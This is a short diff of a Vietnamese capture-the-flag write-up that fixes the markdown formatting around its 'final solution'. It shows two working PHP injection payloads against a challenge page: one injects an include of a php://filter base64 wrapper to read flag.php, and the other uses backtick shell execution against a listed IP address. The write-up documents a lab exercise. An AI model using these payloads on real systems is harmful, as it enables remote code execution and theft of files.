@@ -8,6 +8,6 @@ Tiếp theo sử dụng các công cụ dirscan để tìm ra cờ là flag.php 
 final solution  
 
 ```/xchal.php?name=".include($_GET['a']);$name="&a=php://filter/convert.base64-encode/resource=flag.php```  
-or```
-http://34.18.3.149:8000/xchal.php?name=`%22%26%26+var_dump(`base64%20flag.php`);%23;````
+or
+```http://34.18.3.149:8000/xchal.php?name=`%22%26%26+var_dump(`base64%20flag.php`);%23;````
 # Lưu ý sau khi giải những bài sau
